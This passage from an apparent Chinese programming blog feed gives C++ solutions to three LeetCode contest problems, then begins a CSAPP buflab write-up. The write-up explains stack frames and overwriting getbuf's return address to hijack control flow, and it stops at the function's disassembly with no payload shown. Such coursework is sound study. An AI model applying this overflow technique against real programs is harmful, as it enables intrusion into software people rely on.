rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-40/problems/merge-in-between-linked-lists/</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 链表</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>简单题型，直接找到第<code>a-1</code>和<code>b+1</code>个节点，分别将其与<code>list2</code>的起点和终点链接起来即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeInBetween</span><span class="params">(ListNode* list1, <span class="keyword">int</span> a, <span class="keyword">int</span> b, ListNode* list2)</span> </span>&#123;</span><br><span class="line">        ListNode * la = list1;</span><br><span class="line">        ListNode * lb = list1;</span><br><span class="line">        ListNode * end = list2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a - <span class="number">1</span>; ++i) la = la-&gt;next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b + <span class="number">1</span>; ++i) lb = lb-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(end-&gt;next) end = end-&gt;next;  </span><br><span class="line">        la-&gt;next = list2;</span><br><span class="line">        end-&gt;next = lb;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> list1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5560-设计前中后队列"><a href="#5560-设计前中后队列" class="headerlink" title="5560. 设计前中后队列"></a>5560. 设计前中后队列</h2><p>请你设计一个队列，支持在前，中，后三个位置的 <code>push</code>和 <code>pop</code> 操作。</p><p>请你完成 <code>FrontMiddleBack</code> 类：</p><ul><li>FrontMiddleBack() 初始化队列。</li><li>void pushFront(int val) 将 val 添加到队列的 最前面 。</li><li>void pushMiddle(int val) 将 val 添加到队列的 正中间 。</li><li>void pushBack(int val) 将 val 添加到队里的 最后面 。</li><li>int popFront() 将 最前面 的元素从队列中删除并返回值，如果删除之前队列为空，那么返回 -1 。</li><li>int popMiddle() 将 正中间 的元素从队列中删除并返回值，如果删除之前队列为空，那么返回 -1 。</li><li>int popBack() 将 最后面 的元素从队列中删除并返回值，如果删除之前队列为空，那么返回 -1 。<br>请注意当有 两个 中间位置的时候，选择靠前面的位置进行操作。比方说：</li></ul><p>将 6 添加到 [1, 2, 3, 4, 5] 的中间位置，结果数组为 [1, 2, 6, 3, 4, 5] 。<br>从 [1, 2, 3, 4, 5, 6] 的中间位置弹出元素，返回 3 ，数组变为 [1, 2, 4, 5, 6] 。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">[<span class="string">"FrontMiddleBackQueue"</span>, <span class="string">"pushFront"</span>, <span class="string">"pushBack"</span>, <span class="string">"pushMiddle"</span>, <span class="string">"pushMiddle"</span>, <span class="string">"popFront"</span>, <span class="string">"popMiddle"</span>, <span class="string">"popMiddle"</span>, <span class="string">"popBack"</span>, <span class="string">"popFront"</span>]</span><br><span class="line">[[], [<span class="number">1</span>], [<span class="number">2</span>], [<span class="number">3</span>], [<span class="number">4</span>], [], [], [], [], []]</span><br><span class="line">输出：</span><br><span class="line">[null, null, null, null, null, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">解释：</span><br><span class="line">FrontMiddleBackQueue q = new FrontMiddleBackQueue();</span><br><span class="line">q.pushFront(<span class="number">1</span>);   <span class="comment">// [1]</span></span><br><span class="line">q.pushBack(<span class="number">2</span>);    <span class="comment">// [1, 2]</span></span><br><span class="line">q.pushMiddle(<span class="number">3</span>);  <span class="comment">// [1, 3, 2]</span></span><br><span class="line">q.pushMiddle(<span class="number">4</span>);  <span class="comment">// [1, 4, 3, 2]</span></span><br><span class="line">q.popFront();     <span class="comment">// 返回 1 -&gt; [4, 3, 2]</span></span><br><span class="line">q.popMiddle();    <span class="comment">// 返回 3 -&gt; [4, 2]</span></span><br><span class="line">q.popMiddle();    <span class="comment">// 返回 4 -&gt; [2]</span></span><br><span class="line">q.popBack();      <span class="comment">// 返回 2 -&gt; []</span></span><br><span class="line">q.popFront();     <span class="comment">// 返回 -1 -&gt; [] （队列为空）</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= val &lt;= 109</code></li><li>最多调用 1000 次 <code>pushFront</code>， <code>pushMiddle</code>， <code>pushBack</code>， <code>popFront</code>， <code>popMiddle</code> 和 <code>popBack</code> 。</li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/contest/biweekly-contest-40/problems/design-front-middle-back-queue/" target="_blank" rel="noopener">https://leetcode-cn.com/contest/biweekly-contest-40/problems/design-front-middle-back-queue/</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 两个队列或者双向链表</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>首先想到的就是双向链表，每次保存最中间的节点，需要<code>pop</code>或者<code>push</code>数据时，将中间节点删掉，同时将指针往前或者往后移动一位即可。</li><li>当然链表的操作还是太麻烦了，我们可以用两个双端队列来保存全部队列的值，其中<code>queue1</code>保存前半段，<code>queue2</code>保存后半段。</li></ol><ul><li><code>push_front,pop_front</code>： 我们直接从<code>queue1</code>中进行<code>push,pop</code>操作即可，当然<code>queue1</code>为空时，则<code>pop</code>需要从<code>queue2</code>中进行即可。</li><li><code>push_back,pop_back</code>： 我们直接从<code>queue2</code>中进行<code>push,pop</code>操作即可，当然<code>queue2</code>为空时，则<code>pop</code>需要从<code>queue1</code>中进行即可。</li><li><code>push_middle,pop_middle</code>: 我们首先需要将<code>queue1,queue2</code>的长度线性调整为平衡即可，则此时<code>push</code>时我们往<code>queue1</code>进行<code>push_back</code>即可；<code>pop</code>时，我们从<code>queue2</code>进行<code>pop_back</code>即可，这样刚好能够保证在正中间进行操作。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FrontMiddleBackQueue</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">deque</span>&lt;<span class="keyword">int</span>&gt; pq1;</span><br><span class="line">    <span class="built_in">deque</span>&lt;<span class="keyword">int</span>&gt; pq2;</span><br><span class="line">    FrontMiddleBackQueue() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pushFront</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        pq1.push_front(val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pushMiddle</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = pq1.size() + pq2.size();</span><br><span class="line">        <span class="keyword">int</span> mid = n/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(pq1.size() &gt; mid)&#123;</span><br><span class="line">            pq2.push_front(pq1.back());</span><br><span class="line">            pq1.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(pq1.size() &lt; mid)&#123;</span><br><span class="line">            pq1.push_back(pq2.front());</span><br><span class="line">            pq2.pop_front();</span><br><span class="line">        &#125;</span><br><span class="line">        pq1.push_back(val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pushBack</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        pq2.push_back(val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">popFront</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(pq1.empty() &amp;&amp; pq2.empty()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(pq1.empty())&#123;</span><br><span class="line">            val = pq2.front();</span><br><span class="line">            pq2.pop_front();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            val = pq1.front();</span><br><span class="line">            pq1.pop_front();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">popMiddle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = pq1.size() + pq2.size();</span><br><span class="line">        <span class="keyword">int</span> mid = n/<span class="number">2</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(pq1.empty() &amp;&amp; pq2.empty()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(pq1.size() &gt; mid)&#123;</span><br><span class="line">            pq2.push_front(pq1.back());</span><br><span class="line">            pq1.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(pq1.size() &lt; mid)&#123;</span><br><span class="line">            pq1.push_back(pq2.front());</span><br><span class="line">            pq2.pop_front();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> val = pq1.back();</span><br><span class="line">            pq1.pop_back();</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> val = pq2.front();</span><br><span class="line">            pq2.pop_front();</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">popBack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(pq1.empty() &amp;&amp; pq2.empty()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(pq2.empty())&#123;</span><br><span class="line">            val = pq1.back();</span><br><span class="line">            pq1.pop_back();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            val = pq2.back();</span><br><span class="line">            pq2.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your FrontMiddleBackQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * FrontMiddleBackQueue* obj = new FrontMiddleBackQueue();</span></span><br><span class="line"><span class="comment"> * obj-&gt;pushFront(val);</span></span><br><span class="line"><span class="comment"> * obj-&gt;pushMiddle(val);</span></span><br><span class="line"><span class="comment"> * obj-&gt;pushBack(val);</span></span><br><span class="line"><span class="comment"> * int param_4 = obj-&gt;popFront();</span></span><br><span class="line"><span class="comment"> * int param_5 = obj-&gt;popMiddle();</span></span><br><span class="line"><span class="comment"> * int param_6 = obj-&gt;popBack();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5559-得到山形数组的最少删除次数"><a href="#5559-得到山形数组的最少删除次数" class="headerlink" title="5559. 得到山形数组的最少删除次数"></a>5559. 得到山形数组的最少删除次数</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>我们定义 arr 是 山形数组 当且仅当它满足：</p><ul><li><code>arr.length &gt;= 3</code></li><li>存在某个下标 i （从 0 开始） 满足 0 &lt; i &lt; arr.length - 1 且：</li></ul><ul><li><ul><li><code>arr[0] &lt; arr[1] &lt; ... &lt; arr[i - 1] &lt; arr[i]</code></li></ul></li></ul><ul><li><ul><li><code>arr[i] &gt; arr[i + 1] &gt; ... &gt; arr[arr.length - 1]</code><br>给你整数数组 nums​ ，请你返回将 nums 变成 山形状数组 的​ 最少 删除次数。</li></ul></li></ul><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：数组本身就是山形数组，所以我们不需要删除任何元素。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">3</span></span><br><span class="line">解释：一种方法是将下标为 <span class="number">0</span>，<span class="number">1</span> 和 <span class="number">5</span> 的元素删除，剩余元素为 [<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">1</span>] ，是山形数组。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">提示：</span><br><span class="line"></span><br><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>3 &lt;= nums.length &lt;= 1000</code></li><li><code>1 &lt;= nums[i] &lt;= 109</code></li><li>题目保证 <code>nums</code> 删除一些元素后一定能得到山形数组。</li></ul><h3 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-initial-energy-to-finish-tasks</a></p><h3 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 动态规划</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>这个题目没有任何意义，非常简单的<code>dp</code>,<code>dpl[i]</code>代表从以<code>nums[i]</code>为结尾，前<code>i</code>个元素构成的最长的递增子序列的长度，<code>dpr[i]</code>代表从以<code>nums[i]</code>为结尾，后<code>n-i</code>个元素构成的最长的递增子序列的长度.非常简单的<code>dp</code>.<script type="math/tex; mode=display">ans = max(ans,n-(dpl[i] + dpr[i] - 1)) \qquad i \in[1,n-2]</script><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumMountainRemovals</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = n;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dpl(n,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dpr(n,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] &gt; nums[j])&#123;</span><br><span class="line">                    dpl[i] = max(dpl[i],dpl[j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = n<span class="number">-1</span>; j &gt; i; --j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i] &gt; nums[j])&#123;</span><br><span class="line">                    dpr[i] = max(dpr[i],dpr[j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n<span class="number">-1</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dpl[i] &gt; <span class="number">1</span> &amp;&amp; dpr[i] &gt; <span class="number">1</span>) ans = min(ans,n-(dpl[i]+dpr[i]<span class="number">-1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-biweekl-contest-40&quot;&gt;&lt;a href=&quot;#leetcode-biweekl-contest-40&quot; class=&quot;headerlink&quot; title=&quot;leetcode  biweekl contest 40&quot;&gt;&lt;/a&gt;leetcode  biweekl contest 40&lt;/h1&gt;&lt;p&gt;今天的双周赛的题目实在是太简单了，基本上完全没有任何难度，除了题目麻烦容易出错以外，真心特别简单，基本上没有&lt;code&gt;hard&lt;/code&gt;难度，题目太没有诚意了,天冷了写代码速度都变慢了。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2020/11/28/UL9NKgnJsk78THv.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;5557-最大重复子字符串&quot;&gt;&lt;a href=&quot;#5557-最大重复子字符串&quot; class=&quot;headerlink&quot; title=&quot;5557. 最大重复子字符串&quot;&gt;&lt;/a&gt;5557. 最大重复子字符串&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个字符串 &lt;code&gt;sequence&lt;/code&gt;，如果字符串 &lt;code&gt;word&lt;/code&gt; 连续重复&lt;code&gt;k&lt;/code&gt;次形成的字符串是 &lt;code&gt;sequence&lt;/code&gt; 的一个子字符串，那么单词&lt;code&gt;word&lt;/code&gt; 的 重复值为 k 。单词 word 的 最大重复值 是单词 &lt;code&gt;word&lt;/code&gt;在 &lt;code&gt;sequence&lt;/code&gt; 中最大的重复值。如果 &lt;code&gt;word&lt;/code&gt;不是 &lt;code&gt;sequence&lt;/code&gt;的子串，那么重复值 k 为 0 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【CSAPP】 Lab3</title>
    <link href="http://yoursite.com/2020/11/26/229/"/>
    <id>http://yoursite.com/2020/11/26/229/</id>
    <published>2020-11-26T05:57:44.757Z</published>
    <updated>2020-11-26T07:52:41.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSAPP-lab3-bufboomb"><a href="#CSAPP-lab3-bufboomb" class="headerlink" title="CSAPP lab3 bufboomb"></a>CSAPP lab3 bufboomb</h1><p>本次实验的<code>project</code>为<code>buflab</code>，这个<code>lab</code>比上次<code>lab2</code>有意思多了，上次主要是读汇编代码太恶心了点，许多太难理解了。这次的<code>lab</code>主要为详细描述缓冲区溢出的<code>shellcode</code>编写，每个小的<code>case</code>非常有意思，花了差不多大概四天的时间，利用每天晚上的时间，终于把五个<code>case</code>全部通过，通过这<code>5</code>个<code>case</code>基本熟悉了<code>shellcode</code>的编写和缓冲区溢出的攻击原理，本质是利用堆栈模型的漏洞，利用函数返回值的跳转来进行不同的跳转。</p><a id="more"></a><ul><li>首先我们需要了解程序的调用过程和基本的汇编命令的指令的原理：</li></ul><ol><li><code>call</code> 指令的执行原理：<code>Call address</code>,将下一条指令的地址入栈，然后跳转到<code>address</code>对应的指令。<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> [next]</span><br><span class="line"><span class="keyword">jmp</span> address</span><br></pre></td></tr></table></figure></li><li><code>ret</code>指令的执行原理，<code>ret</code>将栈顶的数据出栈送入到<code>eip</code>寄存器，然后进行跳转。<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span> %eip,</span><br><span class="line"><span class="keyword">jmp</span></span><br></pre></td></tr></table></figure></li><li>堆栈中<code>procedure</code>的调用的基本过程，将被调用的函数的参数从右至左依次入栈;将下一条指令入栈，跳转到函数进行执行;进入到被执行的函数时，首先会将当前的<code>ebp</code>入栈。<br><img src="https://i.loli.net/2020/11/26/DFieZPoyp7hnsW4.png" alt="1"><br>搞清楚以上三点的信息后，对这<code>5</code>个<code>case</code>就能非常熟悉和了解了。</li></ol><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>关于<code>getbuf</code>函数的原型:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbuf */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们可以看到<code>getbuf</code>函数中栈上的申请的字符串的长度为<code>32</code>，我们缓冲区的溢出的原理也是对<code>buf</code>的空间进行连续的填充，直到将<code>getbuf</code>函数的返回指令的地址用我们自定义的地址进行覆盖，从而执行完<code>getbuf</code>函数后，在返回时将会跳转到我们所需要的地址即可。我们同时仔细分析一下<code>getbuf</code>函数的汇编代码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">080491f</span>4 &lt;getbuf&gt;:</span><br><span class="line"> <span class="number">80491f</span>4:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">80491f</span>5:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">80491f</span>7:       <span class="number">83</span> ec <span class="number">38</span>                sub    $<span class="number">0x38</span>,%esp</span><br><span class="line"> <span class="number">80491f</span>a:       <span class="number">8</span>d <span class="number">45</span> d8                lea    <span class="number">-0x28</span>(%ebp),%eax</span><br><span class="line"> <span class="number">80491f</span>d:       <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    